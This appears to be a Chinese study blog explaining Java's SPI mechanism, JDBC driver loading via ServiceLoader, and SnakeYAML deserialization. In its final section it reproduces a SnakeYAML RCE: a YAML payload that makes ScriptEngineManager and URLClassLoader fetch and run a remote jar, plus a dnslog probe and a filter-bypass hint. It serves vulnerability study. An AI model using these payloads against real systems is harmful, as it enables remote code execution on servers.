# 从SPI机制学习数据库驱动加载过程到SnakeYaml反序列化分析

#### 说明：此篇记录SPI、数据库加载过程、SnakeYaml反序列化的相关学习

# 1.SPI 介绍

## 1.1 什么是SPI ？

SPI 全称：Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的接口，它可以用来启用框架扩展和替换组件。

面向的对象的设计里，我们一般推荐模块之间基于接口编程，模块之间不对实现类进行硬编码。一旦代码里涉及具体的实现类，就违反了可拔插的原则，如果需要替换一种实现，就需要修改代码。

为了实现在模块装配的时候不用在程序里动态指明，这就需要一种服务发现机制。java spi就是提供这样的一个机制：为某个接口寻找服务实现的机制。这有点类似IOC的思想，将装配的控制权移到了程序之外。

SPI的作用就是为被扩展的API寻找服务实现。

SPI（Service Provider Interface），是JDK内置的一种 服务提供发现机制，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口，其他不同厂商可以针对同一接口做出不同的实现，[MySQL](https://cloud.tencent.com/product/cdb?from=10680)和[PostgreSQL](https://cloud.tencent.com/product/postgresql?from=10680)都有不同的实现提供给用户，而Java的SPI机制可以为某个接口寻zhao服务实现。Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是 解耦。

SPI整体机制图如下：

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/11fyjok5n6.png)

当服务的提供者提供了一种接口的实现之后，需要在classpath下的META-INF/services/目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的META-INF/services/中的配置文件，配置文件中有接口的具体实现类名，可以根据这个类名进行加载实例化，就可以使用该服务了。JDK中查找服务的实现的工具类是：java.util.ServiceLoader。

## 1.2 SPI 的不足

1.不能按需加载，需要遍历所有的实现，并实例化，然后在循环中才能找到我们需要的实现。如果不想用某些实现类，或者某些类实例化很耗时，它也被载入并实例化了，这就造成了浪费。

2.获取某个实现类的方式不够灵活，只能通过 Iterator 形式获取，不能根据某个参数来获取对应的实现类。（Spring 的BeanFactory，ApplicationContext 就要高级一些了。）

3.多个并发多线程使用 ServiceLoader 类的实例是不安全的。

# 2. API 与 SPI

## 2.1 SPI与API区别：

API是调用并用于实现目标的类、接口、方法等的描述；

SPI是扩展和实现以实现目标的类、接口、方法等的描述；

换句话说，API 为操作提供特定的类、方法，SPI 通过操作来符合特定的类、方法。

>  参考： [https://stackoverflow.com/questions/2954372/difference-between-spi-and-api?answertab=votes#tab-top](https://links.jianshu.com/go?to=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F2954372%2Fdifference-between-spi-and-api%3Fanswertab%3Dvotes%23tab-top) 

## 2.2 SPI和API的使用场景解析：

- API （Application Programming Interface）在大多数情况下，都是实现方制定接口并完成对接口的实现，调用方仅仅依赖接口调用，且无权选择不同实现。 从使用人员上来说，API 直接被应用开发人员使用。
- SPI （Service Provider Interface）是调用方来制定接口规范，提供给外部来实现，调用方在调用时则选择自己需要的外部实现。  从使用人员上来说，SPI 被框架扩展人员使用。

## 2.3 SPI 应用场景

SPI扩展机制应用场景有很多，比如Common-Logging，JDBC，Dubbo等等。

SPI流程：

有关组织和公式定义接口标准

第三方提供具体实现: 实现具体方法, 配置 META-INF/services/${interface_name} 文件

开发者使用

比如JDBC场景下：

首先在Java中定义了接口java.sql.Driver，并没有具体的实现，具体的实现都是由不同厂商提供。

在MySQL的jar包mysql-connector-java-6.0.6.jar中，可以找到META-INF/services目录，该目录下会有一个名字为java.sql.Driver的文件，文件内容是com.mysql.cj.jdbc.Driver，这里面的内容就是针对Java中定义的接口的实现。

同样在PostgreSQL的jar包PostgreSQL-42.0.0.jar中，也可以找到同样的配置文件，文件内容是org.postgresql.Driver，这是PostgreSQL对Java的java.sql.Driver的实现。

# 3. SPI Demo

## 3.1 Java代码开发

首先第一步，定义一个接口：

**Phone.java**

```java
package com.light.sword;

/**
 * @author: Jack
 * 2021/1/31 上午1:44
 */
public interface Phone {
    String getSystemInfo();
}
```



这个接口分别有两个实现：

**Huawei.java**

```java
package com.light.sword;

/**
 * @author: Jack
 * 2021/1/31 上午1:48
 */
public class Huawei implements Phone {
    @Override
    public String getSystemInfo() {
        return "Hong Meng";
    }
}
```

**IPhone.java**

```java
package com.light.sword;

/**
 * @author: Jack
 * 2021/1/31 上午1:48
 */
public class IPhone implements Phone {
    @Override
    public String getSystemInfo() {
        return  "iOS";
    }
}
```

复制

**约定配置：新建 META-INF/services 目录**

>  注意：这个META-INF/services 目录是写死的约定，在 `java.util.ServiceLoader` 源码实现中, java.util.ServiceLoader#PREFIX 可以看到这个目录的硬编码。 

然后需要在resources目录下新建 `META-INF/services` 目录，并且在这个目录下新建一个与上述接口的全限定名一致的文件:

com.light.sword.Phone (这是一个文件，是的，一切皆是文件。)

在这个文件中写入接口的实现类的全限定名（文件 com.light.sword.Phone 中写死的内容）：

```javascript
com.light.sword.Huawei
com.light.sword.IPhone
```

**加载实现类并调用服务**

运行结果以及配置如下图所示：

![image-20221120111333104](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20221120111333104.png)

工程源代码：[https://gitee.com/universsky/java-spi-demo](https://links.jianshu.com/go?to=https%3A%2F%2Fgitee.com%2Funiverssky%2Fjava-spi-demo)

这样一个简单的 Java SPI 的demo就完成了。可以看到其中最为核心的就是通过一系列的约定（其实，就是按照人家 `java.util.ServiceLoader`   的规范标准来）， 然后，通过ServiceLoader 这个类来加载具体的实现类，进而调用实现类的服务。

------

>  知识拓展： 其实，我们在Spring框架中，可以通过 `component-scan` 标签来对指定包路径进行扫描，只要扫到 Spring 制定的 `@Service`、`@Controller` 等注解，spring自动会把它注入[容器](https://cloud.tencent.com/product/tke?from=10680)。 这就相当于spring制定了注解规范，我们按照这个注解规范开发相应的实现类或controller，spring并不需要感知我们是怎么实现的，他只需要根据注解规范和scan标签注入相应的bean，这正是 spi 理念的体现。

## 3.2 SPI 实现原理解析

首先，ServiceLoader实现了Iterable接口，所以它有迭代器的属性，这里主要都是实现了迭代器的hasNext和next方法。这里主要都是调用的lookupIterator的相应hasNext和next方法，lookupIterator是懒加载迭代器。

其次，LazyIterator中的hasNext方法，静态变量PREFIX就是”META-INF/services/”目录，这也就是为什么需要在classpath下的META-INF/services/目录里创建一个以服务接口命名的文件。

当调用 ServiceLoader.load(Class clz) 方法时，会到jar中中的目录 "META-INF/services/" + clz.getName 进行文件读取，

然后当在调用LazyIterator.hasNext() 时，在文件中读取到实际的服务实现类并把它们通过调用 Class.forName(String name, boolean initialize,ClassLoader loader)进行类加载。

## 3.3 源码分析

ServiceLoader 里面提供两个静态的loader 方法和一个内部类 LazyIterator（延迟加载的迭代器）

**根据Main 类中的方法**

```
ServiceLoader.load(Phone.class)
首先会调用load-->ServiceLoader-->reload-->LazyIterator
下面逐步分析
```

**1. loader 方法分析：**

```java
 // 此方法是通过外部传递过来需要加载的服务接口的class 对象，最终会通过class.getName 当作jar包资源文件名    "META-INF/services/" + clz.getName  
 public static <S> ServiceLoader<S> load(Class<S> service) {
        //获取当前线程类加载器
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        return ServiceLoader.load(service, cl);
 }
 

//安全认证之后，调用reload（）方法
private ServiceLoader(Class<S> svc, ClassLoader cl) {
        service = Objects.requireNonNull(svc, "Service interface cannot be null");
        loader = (cl == null) ? ClassLoader.getSystemClassLoader() : cl;
        acc = (System.getSecurityManager() != null) ? AccessController.getContext() : null;
        reload();
}

// 主要是创建当前serviceLoader 对象中的属性LazyIterator lookupIterator 对象，用于当有程序需要访问SPI 实现类时，它再进行加载
public void reload() {
        providers.clear();
        lookupIterator = new LazyIterator(service, loader);
}

```

2. **内部实现lazy 加载的内部类迭代器:**

```java
private class LazyIterator implements Iterator<S>
    {
        Class<S> service;
        ClassLoader loader;
        Enumeration<URL> configs = null;
        Iterator<String> pending = null;
        String nextName = null;
 
        private LazyIterator(Class<S> service, ClassLoader loader) {
            this.service = service;
            this.loader = loader;
        }
 
        private boolean hasNextService() {
            if (nextName != null) {
                return true;
            }
            if (configs == null) {
                try {
                    // 组装配置文件路径
                    String fullName = PREFIX + service.getName();
                    if (loader == null)
                        //获取文件中的URL,如果类加载器为null,会委托系统类加载器进行加载(ClassLoader 中实现的)
                        configs = ClassLoader.getSystemResources(fullName);
                    else
                         //获取文件中的URL
                        configs = loader.getResources(fullName);
                } catch (IOException x) {
                    fail(service, "Error locating configuration files", x);
                }
            }
            while ((pending == null) || !pending.hasNext()) {
                if (!configs.hasMoreElements()) {
                    return false;
                }
                // 从配置的文件中读取组装 服务提供者实现类的类名
                pending = parse(service, configs.nextElement());
            }
            nextName = pending.next();
            return true;
        }
 
        private S nextService() {
            if (!hasNextService())
                throw new NoSuchElementException();
            String cn = nextName;
            nextName = null;
            Class<?> c = null;
            try {
                c = Class.forName(cn, false, loader);
            } catch (ClassNotFoundException x) {
                fail(service,
                     "Provider " + cn + " not found");
            }
            if (!service.isAssignableFrom(c)) {
                fail(service,
                     "Provider " + cn  + " not a subtype");
            }
            try {
                S p = service.cast(c.newInstance());
                providers.put(cn, p);
                return p;
            } catch (Throwable x) {
                fail(service,
                     "Provider " + cn + " could not be instantiated",
                     x);
            }
            throw new Error();          // This cannot happen
        }
 
        public boolean hasNext() {
            if (acc == null) {
                return hasNextService();
            } else {
                PrivilegedAction<Boolean> action = new PrivilegedAction<Boolean>() {
                    public Boolean run() { return hasNextService(); }
                };
                return AccessController.doPrivileged(action, acc);
            }
        }
 
        public S next() {
            if (acc == null) {
                return nextService();
            } else {
                PrivilegedAction<S> action = new PrivilegedAction<S>() {
                    public S run() { return nextService(); }
                };
                return AccessController.doPrivileged(action, acc);
            }
        }
 
        public void remove() {
            throw new UnsupportedOperationException();
        }
 
    }
```

LazyIterator，注意此处是Lazy，也就懒加载。此时并不会去加载文件下的内容

**当遍历器被遍历时，才会去读取配置文件。**并且通过反射的方法调用配置文件中的类

```java
 public Iterator<S> iterator() {
        return new Iterator<S>() {

            Iterator<Map.Entry<String,S>> knownProviders
                = providers.entrySet().iterator();

            public boolean hasNext() {
                if (knownProviders.hasNext())
                    return true;
                return lookupIterator.hasNext();
            }

            public S next() {
                if (knownProviders.hasNext())
                    return knownProviders.next().getValue();
                return lookupIterator.next();
            }

            public void remove() {
                throw new UnsupportedOperationException();
            }

        };
    }
```

# 4. 数据库驱动加载过程

## 4.1 mysql驱动的加载来演示加载方式的区别

**mysql 的SPI相关的接口定义**

![image-20221120140302847](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20221120140302847.png)



```java
//传统加载方式 1
Class.forName("com.mysql.jdbc.Driver");
Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:33061/xxx?useUnicode=true&characterEncoding=utf-8&zeroDateTimeBehavior=convertToNull", "root", "123456");

//传统加载方式 2
System.setProperty("jdbc.drivers","com.mysql.jdbc.Driver");
Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:33061/xxx?useUnicode=true&characterEncoding=utf-8&zeroDateTimeBehavior=convertToNull", "root", "123456");

//SPI加载方式
Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:33061/xxx?useUnicode=true&characterE
```

DriverManager有一个初始化的静态块，这会在执行getConnection前运行

```java
static {
        //初始化驱动
        loadInitialDrivers();
        println("JDBC DriverManager initialized");
    }
```

```java
//以下代码删除源码注释减少篇幅
private static void loadInitialDrivers() {
        //这里drivers的获取对应我提到的 传统加载方式 2
        String drivers;
        try {
            drivers = AccessController.doPrivileged(new PrivilegedAction<String>() {
                public String run() {
                    return System.getProperty("jdbc.drivers");
                }
            });
        } catch (Exception ex) {
            drivers = null;
        }

        //以下代码是SPI机制的加载部分
        AccessController.doPrivileged(new PrivilegedAction<Void>() {
            public Void run() {
                //获取驱动的集合
                ServiceLoader<Driver> loadedDrivers = ServiceLoader.load(Driver.class);
                //获取集合迭代器
                Iterator<Driver> driversIterator = loadedDrivers.iterator();

                try{
                    //hasNext()有接口实现类查找逻辑
                    while(driversIterator.hasNext()) {
                        //next()方法里面进行了实例化
                        driversIterator.next();
                    }
                } catch(Throwable t) {
                // Do nothing
                }
                return null;
            }
        });

        println("DriverManager.initialize: jdbc.drivers = " + drivers);

        //jdbc.drivers变量获取到实现类权限命名，处理后调用反射实例化
        if (drivers == null || drivers.equals("")) {
            return;
        }
        String[] driversList = drivers.split(":");
        println("number of Drivers:" + driversList.length);
        for (String aDriver : driversList) {
            try {
                println("DriverManager.Initialize: loading " + aDriver);
                Class.forName(aDriver, true,
                        ClassLoader.getSystemClassLoader());
            } catch (Exception ex) {
                println("DriverManager.Initialize: load failed: " + ex);
            }
        }
    }
```

很疑惑的方法，SPI加载的地方，遍历了一下所有驱动却什么都没做，估计在driversIterator.hasNext()方法和driversIterator.next()中，先分析ServiceLoader迭代器源码

```java
public Iterator<S> iterator() {
        return new Iterator<S>() {

            //providers变量是ServiceLoader中全局变量，在执行ServiceLoader.load(Driver.class)方法初始化的时候调用了providers.clear()，清空了，所以一下方法都不走if条件
            Iterator<Map.Entry<String,S>> knownProviders
                = providers.clear()，.entrySet().iterator();

            public boolean hasNext() {
                if (knownProviders.hasNext())
                    return true;
                return lookupIterator.hasNext();
            }

            public S next() {
                if (knownProviders.hasNext())
                    return knownProviders.next().getValue();
                return lookupIterator.next();
            }

            public void remove() {
                throw new UnsupportedOperationException();
            }

        };
    }
```

lookupIterator变量是ServiceLoader中私有迭代器的实现类，故hasNext()，next()都是私有迭代器的方法，先看hasNext

```java
public boolean hasNext() {
            if (acc == null) {
                return hasNextService();
            } else {
                PrivilegedAction<Boolean> action = new PrivilegedAction<Boolean>() {
                    public Boolean run() { return hasNextService(); }
                };
                return AccessController.doPrivileged(action, acc);
            }
        }
```

两个分支都调用了hasNextService()

```java
private boolean hasNextService() {
            if (nextName != null) {
                return true;
            }
            if (configs == null) {
                try {
                    //fullName在此案例中是META-INF/services/java.sql.Driver
                    String fullName = PREFIX + service.getName();
                    //获取classpath下文件名为META-INF/services/java.sql.Driver的配置元素
                    if (loader == null)
                        configs = ClassLoader.getSystemResources(fullName);
                    else
                        configs = loader.getResources(fullName);
                } catch (IOException x) {
                    fail(service, "Error locating configuration files", x);
                }
            }
            while ((pending == null) || !pending.hasNext()) {
                if (!configs.hasMoreElements()) {
                    return false;
                }
                //当pending==null，configs有下个元素的时候，初始化pending
                pending = parse(service, configs.nextElement());
            }
            nextName = pending.next();
            return true;
        }
```

看pending = parse(service, configs.nextElement());

```java
private Iterator<String> parse(Class<?> service, URL u)
        throws ServiceConfigurationError
    {
        InputStream in = null;
        BufferedReader r = null;
        ArrayList<String> names = new ArrayList<>();
        try {
            in = u.openStream();
            r = new BufferedReader(new InputStreamReader(in, "utf-8"));
            int lc = 1;
            while ((lc = parseLine(service, u, r, lc, names)) >= 0);
        } catch (IOException x) {
            fail(service, "Error reading configuration file", x);
        } finally {
            try {
                if (r != null) r.close();
                if (in != null) in.close();
            } catch (IOException y) {
                fail(service, "Error closing configuration file", y);
            }
        }
        return names.iterator();
    }
```

返回的是一个所有实现类权限命名的集合的迭代器，hasNext()看完继续查看next()

```java
public S next() {
            if (acc == null) {
                return nextService();
            } else {
                PrivilegedAction<S> action = new PrivilegedAction<S>() {
                    public S run() { return nextService(); }
                };
                return AccessController.doPrivileged(action, acc);
            }
        }
```

调用nextService();

```java
private S nextService() {
            if (!hasNextService())
                throw new NoSuchElementException();
            String cn = nextName;
            nextName = null;
            Class<?> c = null;
            try {
            //在这里对各个实现类装载进虚拟机中，第二个参数false表示，不初始化，第三个参数在实例化ServiceLoader的时候是通过Thread.currentThread().getContextClassLoader();获取的线程上下文加载器
                c = Class.forName(cn, false, loader);
            } catch (ClassNotFoundException x) {
                fail(service,
                     "Provider " + cn + " not found");
            }
            //校验驱动来源是否官方
            if (!service.isAssignableFrom(c)) {
                fail(service,
                     "Provider " + cn  + " not a subtype");
            }
            try {
                //newInstance对class文件进行实例化
                S p = service.cast(c.newInstance());
                providers.put(cn, p);
                return p;
            } catch (Throwable x) {
                fail(service,
                     "Provider " + cn + " could not be instantiated",
                     x);
            }
            throw new Error();          // This cannot happen
        }
```

至此各个驱动实例化过程分析结束，再回头分析DriverManager的getConnection方法

```java
public static Connection getConnection(String url,
        String user, String password) throws SQLException {
        java.util.Properties info = new java.util.Properties();

        if (user != null) {
            info.put("user", user);
        }
        if (password != null) {
            info.put("password", password);
        }

        return (getConnection(url, info, Reflection.getCallerClass()));
    }
```

查看getConnection方法

```text
private static Connection getConnection(
        String url, java.util.Properties info, Class<?> caller) throws SQLException {

        ClassLoader callerCL = caller != null ? caller.getClassLoader() : null;
        synchronized(DriverManager.class) {
            if (callerCL == null) {
                callerCL = Thread.currentThread().getContextClassLoader();
            }
        }

        if(url == null) {
            throw new SQLException("The url cannot be null", "08001");
        }

        println("DriverManager.getConnection(\"" + url + "\")");


        SQLException reason = null;
        //遍历所有驱动依次使用url尝试连接数据库
        for(DriverInfo aDriver : registeredDrivers) {
            //isDriverAllowed涉及到安全方面的一些控制，不是很清楚
            if(isDriverAllowed(aDriver.driver, callerCL)) {
                try {
                    println("    trying " + aDriver.driver.getClass().getName());
                    Connection con = aDriver.driver.connect(url, info);
                    if (con != null) {
                        // Success!
                        println("getConnection returning " + aDriver.driver.getClass().getName());
                        return (con);
                    }
                } catch (SQLException ex) {
                    if (reason == null) {
                        reason = ex;
                    }
                }

            } else {
                println("    skipping: " + aDriver.getClass().getName());
            }

        }

        if (reason != null)    {
            println("getConnection failed: " + reason);
            throw reason;
        }

        println("getConnection: no suitable driver found for "+ url);
        throw new SQLException("No suitable driver found for "+ url, "08001");
    }
```

我们注意到有个registeredDrivers全局变量，这个变量的初始化在驱动实现类的static方法中，例如

```java
public class Driver extends NonRegisteringDriver implements java.sql.Driver {
    public Driver() throws SQLException {
    }

    static {
        try {
            DriverManager.registerDriver(new Driver());
        } catch (SQLException var1) {
            throw new RuntimeException("Can't register driver!");
        }
    }
}
```

当驱动实现类实例化的时候会加载static代码块，而DriverManager.registerDriver(new Driver());会将当前驱动注册到DriverManager

```java
//这是DriverManager的registerDriver方法
     public static synchronized void registerDriver(java.sql.Driver driver)
        throws SQLException {

        registerDriver(driver, null);
    }
public static synchronized void registerDriver(java.sql.Driver driver,
            DriverAction da)
        throws SQLException {

        /* Register the driver if it has not already been added to our list */
        if(driver != null) {
        //这里就是把驱动添加进registeredDrivers全局变量中的地方
            registeredDrivers.addIfAbsent(new DriverInfo(driver, da));
        } else {
            // This is for compatibility with the original DriverManager
            throw new NullPointerException();
        }

        println("registerDriver: " + driver);

    }
```

- 至此源码分析完毕
- 梳理一下SPI加载驱动的过程：DriverManager执行静态代码块的时候，会读取classpath下META-INF/services目录中的驱动实现类并实例化这些驱动，实例化的时候，驱动本身调用registerDriver方法把自身注册到DriverManager的全局变量registeredDrivers中，执行getConnection方法的时候，会轮询registeredDrivers集合的所有驱动，找出能连接数据源的驱动，并把connection返回给用户
- 在分析过程中，我们还可以发现SPI机制完全打破了java设计者们的推崇的双亲委派模型，本应该由根类加载器加载的驱动，最后却是由线程上下文加载器来加载

# 5. SnakeYaml 反序列化

## 5.1 SnakeYaml 使用

`SnakeYaml`是用来解析yaml的格式，可用于Java对象的序列化、反序列化。

SnakeYaml 使用

导入依赖jar包

```xml
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
</dependency>
```

#### 常用方法

```java
String	dump(Object data)
将Java对象序列化为YAML字符串。
void	dump(Object data, Writer output)
将Java对象序列化为YAML流。
String	dumpAll(Iterator<? extends Object> data)
将一系列Java对象序列化为YAML字符串。
void	dumpAll(Iterator<? extends Object> data, Writer output)
将一系列Java对象序列化为YAML流。
String	dumpAs(Object data, Tag rootTag, DumperOptions.FlowStyle flowStyle)
将Java对象序列化为YAML字符串。
String	dumpAsMap(Object data)
将Java对象序列化为YAML字符串。
<T> T	load(InputStream io)
解析流中唯一的YAML文档，并生成相应的Java对象。
<T> T	load(Reader io)
解析流中唯一的YAML文档，并生成相应的Java对象。
<T> T	load(String yaml)
解析字符串中唯一的YAML文档，并生成相应的Java对象。
Iterable<Object>	loadAll(InputStream yaml)
解析流中的所有YAML文档，并生成相应的Java对象。
Iterable<Object>	loadAll(Reader yaml)
解析字符串中的所有YAML文档，并生成相应的Java对象。
Iterable<Object>	loadAll(String yaml)
解析字符串中的所有YAML文档，并生成相应的Java对象。
```

#### 序列化

Myclass类：

```java
package test;
public class MyClass {
    String value;
    public MyClass(String args) {
        value = args;
    }

    public String getValue(){
        return value;
    }
}
```

Test类：

```java
@Test
    public  void test() {

    MyClass obj = new MyClass("this is my data");

    Map<String, Object> data = new HashMap<String, Object>();
    data.put("MyClass", obj);
    Yaml yaml = new Yaml();
    String output = yaml.dump(data);
    System.out.println(output);
}
}
```

结果：

```java
MyClass: !!test.MyClass {}
```

前面的`!!`是用于强制类型转化，强制转换为`!!`后指定的类型，其实这个和Fastjson的`@type`有着异曲同工之妙。用于指定反序列化的全类名。

#### 反序列化

yaml文件：

```yaml
firstName: "John"
lastName: "Doe"
age: 20
```

测试类：

```java
@Test
    public  void test(){
        Yaml yaml = new Yaml();
        InputStream resourceAsStream = this.getClass().getClassLoader().getResourceAsStream("test1.yaml");
        Object load = yaml.load(resourceAsStream);
        System.out.println(load);
    }
}
```

执行结果：

```java
{firstName=John, lastName=Doe, age=20}
```

## 5.2 漏洞复现

首先还是先来复现一下漏洞，能进行利用后再进行分析利用过程。

下面来看到一段POC代码：

```java
public class main {
    public static void main(String[] args) {

        String context = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://fnsdae.dnslog.cn\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(context);
    } 
}
```

[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1993669-20210310225346865-548292742.png)](https://img2020.cnblogs.com/blog/1993669/202103/1993669-20210310225346865-548292742.png)

成功获取dnslog请求，但是这poc也只能探测是否进行了反序列化。如果需要利用的话还需要构造命令执行的代码。

利用脚本其实已经有师傅写好了。转到这个[github](https://github.com/artsploit/yaml-payload/)项目下下载该项目。打开修改代码。

[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1993669-20210310225408944-173246045.png)](https://img2020.cnblogs.com/blog/1993669/202103/1993669-20210310225408944-173246045.png)

脚本也比较简单，就是实现了`ScriptEngineFactory`接口，然后在静态代码块处填写需要执行的命令。将项目打包后挂载到web端，使用payload进行反序列化后请求到该位置，实现`java.net.URLClassLoader`调用远程的类进行执行命令。

```cmake
python -m http.server --cgi 8888
```

测试代码：

```java
public class main {
    public static void main(String[] args) {

        String context = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:8888/yaml-payload-master.jar\"]\n" +
                "  ]]\n" +
                "]";
        Yaml yaml = new Yaml();
        yaml.load(context);
    }

}
```

[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1993669-20210310225519457-502958020.png)](https://img2020.cnblogs.com/blog/1993669/202103/1993669-20210310225519457-502958020.png)

命令执行成功。

## 5.3 漏洞分析

前面说到SPI会通过`java.util.ServiceLoder`进行动态加载实现，而在刚刚的exp的代码里面实现了`ScriptEngineFactory`并在`META-INF/services/` 里面添加了实现类的类名，而该类在静态代码块处是我们的执行命令的代码，而在调用的时候，SPI机制通过`Class.forName`反射加载并且`newInstance()`反射创建对象的时候，静态代码块进行执行，从而达到命令执行的目的。

下面开始调试分析漏洞，在漏洞位置下断点

```
调用链：
getRuntime:68, Runtime (java.lang)
loadLibrary:1871, System (java.lang)
run:85, AbstractPlainSocketImpl$1 (java.net)
run:83, AbstractPlainSocketImpl$1 (java.net)
doPrivileged:-1, AccessController (java.security)
<clinit>:82, AbstractPlainSocketImpl (java.net)
<init>:148, Socket (java.net)
createSocket:199, NetworkClient (sun.net)
doConnect:162, NetworkClient (sun.net)
openServer:474, HttpClient (sun.net.www.http)
openServer:569, HttpClient (sun.net.www.http)
<init>:242, HttpClient (sun.net.www.http)
New:341, HttpClient (sun.net.www.http)
New:362, HttpClient (sun.net.www.http)
getNewHttpClient:1253, HttpURLConnection (sun.net.www.protocol.http)
plainConnect0:1187, HttpURLConnection (sun.net.www.protocol.http)
plainConnect:1081, HttpURLConnection (sun.net.www.protocol.http)
connect:1015, HttpURLConnection (sun.net.www.protocol.http)
getInputStream0:1592, HttpURLConnection (sun.net.www.protocol.http)
getInputStream:1520, HttpURLConnection (sun.net.www.protocol.http)
retrieve:212, URLJarFile (sun.net.www.protocol.jar)
getJarFile:74, URLJarFile (sun.net.www.protocol.jar)
get:176, JarFileFactory (sun.net.www.protocol.jar)
connect:131, JarURLConnection (sun.net.www.protocol.jar)
getJarFile:92, JarURLConnection (sun.net.www.protocol.jar)
getJarFile:820, URLClassPath$JarLoader (jdk.internal.loader)
run:761, URLClassPath$JarLoader$1 (jdk.internal.loader)
run:754, URLClassPath$JarLoader$1 (jdk.internal.loader)
doPrivileged:-1, AccessController (java.security)
ensureOpen:753, URLClassPath$JarLoader (jdk.internal.loader)
<init>:728, URLClassPath$JarLoader (jdk.internal.loader)
run:494, URLClassPath$3 (jdk.internal.loader)
run:477, URLClassPath$3 (jdk.internal.loader)
doPrivileged:-1, AccessController (java.security)
getLoader:476, URLClassPath (jdk.internal.loader)
getLoader:445, URLClassPath (jdk.internal.loader)
next:341, URLClassPath$1 (jdk.internal.loader)
hasMoreElements:352, URLClassPath$1 (jdk.internal.loader)
run:692, URLClassLoader$3$1 (java.net)
run:690, URLClassLoader$3$1 (java.net)
doPrivileged:-1, AccessController (java.security)
next:689, URLClassLoader$3 (java.net)
hasMoreElements:714, URLClassLoader$3 (java.net)
next:3022, CompoundEnumeration (java.lang)
hasMoreElements:3031, CompoundEnumeration (java.lang)
nextProviderClass:1203, ServiceLoader$LazyClassPathLookupIterator (java.util)
hasNextService:1221, ServiceLoader$LazyClassPathLookupIterator (java.util)
hasNext:1265, ServiceLoader$LazyClassPathLookupIterator (java.util)
hasNext:1300, ServiceLoader$2 (java.util)
hasNext:1385, ServiceLoader$3 (java.util)
initEngines:123, ScriptEngineManager (javax.script)
init:87, ScriptEngineManager (javax.script)
<init>:75, ScriptEngineManager (javax.script)
newInstance0:-1, NativeConstructorAccessorImpl (jdk.internal.reflect)
newInstance:62, NativeConstructorAccessorImpl (jdk.internal.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (jdk.internal.reflect)
newInstance:490, Constructor (java.lang.reflect)
construct:570, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)
construct:331, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)
constructObjectNoCheck:229, BaseConstructor (org.yaml.snakeyaml.constructor)
constructObject:219, BaseConstructor (org.yaml.snakeyaml.constructor)
constructDocument:173, BaseConstructor (org.yaml.snakeyaml.constructor)
getSingleData:157, BaseConstructor (org.yaml.snakeyaml.constructor)
loadFromReader:490, Yaml (org.yaml.snakeyaml)
load:416, Yaml (org.yaml.snakeyaml)
main:17, SnakeYamlDemo (com.snakeyaml)
```



1、在`yaml.load(context)`下个断点

![image-20221120174759991](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20221120174759991.png)

2、load方法中，首先通过``new StreamReader(yaml)`读取 传递进入的Poc

![image-20221120174830080](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20221120174830080.png)



https://www.cnblogs.com/CoLo/p/16225141.html 分析的特别好，直接转载

下面调试分析一下整个流程，在yaml.load(s)处下断点
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160043866-2072735465.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160043866-2072735465.png)

首先通过`StringReader`处理我们传入的字符串，PoC存储在StreamReader的this.stream字段值里。
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160056351-753955083.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160056351-753955083.png)

上面主要是对输入的payload进行赋值与简单处理的操作，之后进入`loadFromReader(new StreamReader(yaml), Object.class)`方法中
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160114155-1238683126.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160114155-1238683126.png)

该方法内逻辑如下
[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160124812-108884055.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160124812-108884055.png)

首先会对我们传入的payload进行处理，封装成Composer对象。
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160137947-148735905.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160137947-148735905.png)

其中会有一步`new ParserImpl`的操作
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160148562-105248836.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160148562-105248836.png)

这里注意`!! -> tag:yaml.org,2002:` 后续也会对我们传入的 payload进行字符串替换的操作。

之后调用`BaseConstructor#setComposer()`方法，对`Composer`进行赋值，最终进入`BaseConstructor#getSingleData(type)`方法内，跟进后会调用`this.composer.getSingleNode()`方法对我们传入的payload进行处理，会把`!!`变成tagxx一类的标识
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160246072-687192323.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160246072-687192323.png)

这个在[浅蓝师傅的文章](https://b1ue.cn/archives/407.html)中也有提到过,对于一些yaml常用的set map等类型都是一个tag，属于是在过滤掉`!!`的情况下可以通过这种`tag`形式去进行Bypass，详细的思路可参考浅蓝师傅的文章。

```java
